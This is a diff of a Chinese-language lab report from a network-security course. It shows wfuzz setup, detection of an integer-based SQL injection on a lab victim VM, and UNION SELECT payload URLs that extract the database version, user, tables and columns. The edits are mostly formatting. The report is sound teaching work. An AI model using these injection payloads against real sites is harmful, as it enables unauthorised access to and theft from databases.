@@ -9,13 +9,18 @@
      ![tuopu](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/tuopu.jpg)
          
    安装工具 wfuzz步骤如下：
+
       - 下载[wfuzz](https://github.com/xmendez/wfuzz)
+      - 
       - 解压到共享文件夹，使用时进入解压目录，即可使用wfuzz。
       
   
 - [ ] 攻击分为三步进行：
+- 
 1.Fingerprinting
+
 2.Detection and exploitation of SQL injection
+
 3.Access to the administration pages and code execution
 
 以下是每一步的具体介绍：
@@ -149,17 +154,20 @@ Requests/sec.: 688.6203
 
     a. 基于`Intergers`的检测
 
-     在attacker中访问如下网址 `10.0.2.12/cat.php?id =1`，显示如下：
+        在attacker中访问如下网址 `10.0.2.12/cat.php?id =1`，显示如下：
          ![1](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/1.PNG)
-    在attacker中访问如下网址 `10.0.2.12/cat.php?id =2`，显示如下：
+    
+         在attacker中访问如下网址 `10.0.2.12/cat.php?id =2`，显示如下：
          ![2](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/2.PNG)  
-    在attacker中访问如下网址 `10.0.2.12/cat.php?id =2-1`，显示如下：
+    
+         在attacker中访问如下网址 `10.0.2.12/cat.php?id =2-1`，显示如下：
          ![3](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/3.PNG)
   
-   在attacker中访问如下网址 `10.0.2.12/cat.php?id =2  and 1=1`，推测server端执行 `select id = 2 and 1=1 from .....` ,显示如下：
+        在attacker中访问如下网址 `10.0.2.12/cat.php?id =2  and 1=1`，推测server端执行 `select id = 2 and 1=1 from .....` ,显示如下：
        ![4](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/4.PNG)
 
-  由上面的访问结果可知，当 `id = 2-1` 时,访问结果的页面等同于 `id = 1`,可见减法被数据库自动执行。这样就找到了一个SQL注入。
+ 
+ 由上面的访问结果可知，当 `id = 2-1` 时,访问结果的页面等同于 `id = 1`,可见减法被数据库自动执行。这样就找到了一个SQL注入。
   由上面实验表现可知，victim端数据库查询id时，使用interger而非string。SQL允许两种语法，但是使用interger查询比使用string更快。
   
   
@@ -229,13 +237,16 @@ Requests/sec.: 688.6203
      1.数据库版本  `http://vulnerable/cat.php?id=1 UNION SELECT 1, @@version,3,4`
            ![7](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/7.PNG)
            
- 2.当前用户     `http://vulnerable/cat.php?id=1 UNION SELECT 1, current_user(),3,4`
+ 
+2.当前用户     `http://vulnerable/cat.php?id=1 UNION SELECT 1, current_user(),3,4`
        ![8](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/8.PNG)
         
-   3.当前使用的数据库   `http://vulnerable/cat.php?id=1 UNION SELECT 1, database(),3,4`
+ 
+  3.当前使用的数据库   `http://vulnerable/cat.php?id=1 UNION SELECT 1, database(),3,4`
      ![9](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/9.PNG)
      
-   现在我们可以检索任意我们想检索的信息，为了检索相关信息，我们需要：
+  
+ 现在我们可以检索任意我们想检索的信息，为了检索相关信息，我们需要：
 ```
      当前数据库中的所有表项
      我们想获取信息的表对应的列名
@@ -252,13 +263,16 @@ Requests/sec.: 688.6203
    1.获取所有表格的列表  `http://vulnerable/cat.php?id=1 UNION SELECT 1,table_name ,3,4 FROM information_schema.tables`
          ![10](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/10.PNG)
          
-  2.获取所有列的列表   `http://vulnerable/cat.php?id=1 UNION SELECT 1,column_name ,3,4 FROM information_schema.columns`
+  
+2.获取所有列的列表   `http://vulnerable/cat.php?id=1 UNION SELECT 1,column_name ,3,4 FROM information_schema.columns`
         ![11](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/11.PNG)
         
+
 3.按顺序获取所有列对应属于的表  `http://vulnerable/cat.php?id=1 UNION SELECT 1,table_name ,column_name,4 FROM information_schema.columns`
         ![12](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/12.PNG)
         
- 4.同时输出列和列对应的表名称：  `http://vulnerable/cat.php?id=1 UNION SELECT 1,concat(table_name ,':',column_name),3,4 FROM information_schema.columns`
+ 
+4.同时输出列和列对应的表名称：  `http://vulnerable/cat.php?id=1 UNION SELECT 1,concat(table_name ,':',column_name),3,4 FROM information_schema.columns`
       ![13](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/13.PNG)
       
    ----------------------
